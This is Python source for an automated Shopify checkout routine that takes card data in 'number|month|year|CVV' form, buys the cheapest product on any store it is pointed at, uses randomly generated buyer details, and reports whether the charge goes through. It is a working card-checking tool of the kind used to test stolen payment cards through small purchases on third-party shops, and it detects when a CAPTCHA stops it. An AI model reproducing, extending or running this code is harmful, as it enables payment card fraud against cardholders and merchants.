async def process_card(site_url, card_string):
    async with httpx.AsyncClient(follow_redirects=True, timeout=120.0) as session:
        try:
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🚀 Processing card for site: {site_url}")

            # ---------- Parse card ----------
            try:
                parts = card_string.split('|')
                if len(parts) != 4:
                    return None, "Invalid format! Use: 5306914932131024|02|28|388"
                cc, mon, year, cvv = parts
                mon = mon.zfill(2)
                if len(year) == 2:
                    year = '20' + year
                print(f"Card: {cc[:6]}...{cc[-4:]} | Exp: {mon}/{year} | CVV: {cvv}")
            except:
                return None, "Invalid format! Use: 5306914932131024|02|28|388"

            # ---------- Validate card ----------
            card_check = scc4(cc)
            formatted_cc = sh(cc)
            card_type = card_check.get('type', 'Unknown') if card_check['status'] else 'Unknown'
            if not card_check['status']:
                return None, f"Invalid card: {card_check.get('error')}"
            print(f"Card type: {card_type}, BIN: {card_check.get('bin', 'N/A')}")

            # ---------- Get cheapest product ----------
            ua = USER_AGENT
            headers = {'User-Agent': ua, 'Accept': 'application/json'}
            products_url = f"{site_url.rstrip('/')}/products.json"
            print(f"Fetching products from {products_url}")
            resp = await session.get(products_url, headers=headers)
            if resp.status_code != 200:
                return None, "Could not fetch products"
            data = resp.json()
            min_price = None
            min_variant_id = None
            min_price_str = None
            product_title = None
            for product in data.get('products', []):
                for variant in product.get('variants', []):
                    price = float(variant['price'])
                    if price >= 0.01 and variant.get('available', True) is not False:
                        if min_price is None or price < min_price:
                            min_price = price
                            min_variant_id = variant['id']
                            min_price_str = variant['price']
                            product_title = product['title']
            if min_variant_id is None:
                return None, "No suitable product found"
            print(f"Using product: {product_title} (${min_price_str})")

            # ---------- Add to cart ----------
            cart_add_url = f"{site_url}/cart/{min_variant_id}:1"
            print(f"Adding to cart: {cart_add_url}")
            await session.get(cart_add_url, headers=headers, follow_redirects=True)
            cart_js_url = f"{site_url}/cart.js"
            cart_resp = await session.get(cart_js_url, headers=headers)
            if cart_resp.status_code != 200:
                return None, "Could not get cart token"
            cart_data = cart_resp.json()
            token = cart_data.get('token')
            if not token:
                return None, "No cart token"
            print(f"Cart token: {token}")

            # ---------- Initiate checkout ----------
            checkout_headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': site_url,
                'Referer': f"{site_url}/cart",
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            await session.get(f"{site_url}/checkout", headers=checkout_headers)
            post_data = {'checkout': '', 'updates[]': '1'}
            checkout_resp = await session.post(f"{site_url}/cart", headers=checkout_headers, data=post_data)
            response_text = checkout_resp.text

            # ---------- Save HTML for debugging ----------
            if DEBUG_SAVE_HTML:
                with open("debug_checkout.html", "w", encoding="utf-8") as f:
                    f.write(response_text)
                print("💾 Saved checkout HTML to debug_checkout.html")

            # ---------- Check for JavaScript redirect ----------
            redirect_url = get_redirect_url(response_text)
            if redirect_url:
                print(f"🔁 Following redirect to: {redirect_url}")
                redirect_resp = await session.get(redirect_url, headers={'User-Agent': ua})
                if redirect_resp.status_code != 200:
                    return None, f"Redirect failed: {redirect_resp.status_code}"
                response_text = redirect_resp.text
                if DEBUG_SAVE_HTML:
                    with open("debug_checkout_final.html", "w", encoding="utf-8") as f:
                        f.write(response_text)
                    print("💾 Saved final checkout HTML to debug_checkout_final.html")
                final_url = str(redirect_resp.url)
            else:
                final_url = str(checkout_resp.url)

            # ---------- Extract tokens ----------
            session_token = find_between(response_text, 'name="serialized-sessionToken" content="&quot;', '&quot;"')
            if not session_token:
                session_token = find_between(response_text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
            print(f"Session token: {session_token[:20] if session_token else 'None'}...")

            queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            print(f"Queue token: {queue_token[:20] if queue_token else 'None'}...")

            stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            print(f"Stable ID: {stable_id}")

            payment_method_identifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            print(f"Payment Method ID: {payment_method_identifier}")

            web_build_id = find_between(response_text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;,&quot;debug&quot;')
            print(f"Web build ID: {web_build_id}")

            checkout_token_match = None
            match = re.search(r'/cn/([^/?]+)', final_url)
            if match:
                checkout_token_match = match.group(1)
            else:
                parsed = urlparse(final_url)
                qs = parse_qs(parsed.query)
                if 'source_id' in qs:
                    checkout_token_match = qs['source_id'][0]
            print(f"Checkout token: {checkout_token_match}")

            missing = []
            if not session_token: missing.append("session_token")
            if not queue_token: missing.append("queue_token")
            if not stable_id: missing.append("stable_id")
            if not payment_method_identifier: missing.append("payment_method_identifier")
            if not checkout_token_match: missing.append("checkout_token_match")
            if missing:
                print(f"❌ Missing tokens: {', '.join(missing)}")
                return None, "Failed to extract checkout tokens"

            # ---------- Generate random buyer info ----------
            shop = SimpleShopify()
            random_info = await shop.get_random_info()
            country_code = 'US'
            address_details = get_address_details(country_code)
            print(f"Buyer: {random_info['fname']} {random_info['lname']}, Email: {random_info['email']}, Phone: {random_info['phone']}")

            # ---------- Create payment session ----------
            sessionid = await create_payment_session(session, cc, mon, year, cvv, random_info, site_url)
            if not sessionid:
                return None, "Could not create payment session"
            print(f"Payment session ID: {sessionid[:20]}...")

            # ---------- Proposal mutation ----------
            proposal_payload = build_proposal_payload(
                session_token, queue_token, stable_id, checkout_token_match,
                min_variant_id, min_price_str, address_details, country_code,
                web_build_id, random_info
            )
            proposal_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': site_url,
                'referer': site_url + '/',
                'user-agent': ua,
                'x-checkout-one-session-token': session_token,
                'x-checkout-web-build-id': web_build_id,
                'x-checkout-web-source-id': checkout_token_match,
            }
            proposal_url = f"{site_url}/checkouts/unstable/graphql?operationName=Proposal"
            print("Sending Proposal mutation...")
            proposal_resp = await session.post(proposal_url, headers=proposal_headers, json=proposal_payload)
            if proposal_resp.status_code != 200:
                return None, f"Proposal failed: {proposal_resp.status_code}"
            proposal_data = proposal_resp.json()

            print("\n📦 Proposal response preview:")
            print(json.dumps(proposal_data, indent=2)[:1000])
            if 'errors' in proposal_data:
                print("\n❌ GraphQL Errors:")
                for err in proposal_data['errors']:
                    print(f"  - {err.get('message')} (code: {err.get('extensions', {}).get('code')})")
                return None, "Proposal failed – see errors above"
            if not proposal_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result'):
                print("\n❌ No result in proposal data")
                return None, "Proposal returned no result"

            seller_proposal = proposal_data['data']['session']['negotiate']['result']['sellerProposal']
            delivery_lines = seller_proposal.get('delivery', {}).get('deliveryLines', [])
            if not delivery_lines:
                return None, "No delivery lines"
            available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
            if not available_strategies:
                return None, "No delivery strategies"
            handle = available_strategies[0].get('handle')
            delivery_amount = available_strategies[0].get('amount', {}).get('value', {}).get('amount')
            tax = seller_proposal.get('tax', {}).get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
            total = seller_proposal.get('runningTotal', {}).get('value', {}).get('amount')
            print(f"Delivery handle: {handle}, delivery amount: {delivery_amount}, tax: {tax}, total: {total}")

            # ---------- SubmitForCompletion mutation ----------
            submit_payload = build_submit_payload(
                session_token, queue_token, stable_id, checkout_token_match,
                min_variant_id, min_price_str, address_details, country_code,
                handle, delivery_amount, tax, total, sessionid, payment_method_identifier,
                site_url
            )
            submit_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': site_url,
                'referer': site_url + '/',
                'user-agent': ua,
                'x-checkout-one-session-token': session_token,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-source-id': checkout_token_match,
            }
            submit_url = f"{site_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
            print("Sending SubmitForCompletion mutation...")
            submit_resp = await session.post(submit_url, headers=submit_headers, json=submit_payload)
            if submit_resp.status_code != 200:
                return None, f"SubmitForCompletion failed: {submit_resp.status_code}"
            if 'CAPTCHA_METADATA_MISSING' in submit_resp.text:
                return "⚠️ CAPTCHA required", None
            submit_data = submit_resp.json()
            receipt_id = submit_data.get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('id')
            if not receipt_id:
                return None, "No receipt ID from submit"

            # ---------- Poll for receipt ----------
            result, error = await poll_for_receipt(
                session, site_url, session_token, checkout_token_match, web_build_id,
                receipt_id, ua, product_title, min_price_str, formatted_cc, card_check,
                mon, year
            )
            if error:
                return None, error
            return result, None

        except httpx.TimeoutException:
            return None, "Operation timed out! Site might be slow."
        except Exception as e:
            return None, f"Unexpected error: {str(e)}"

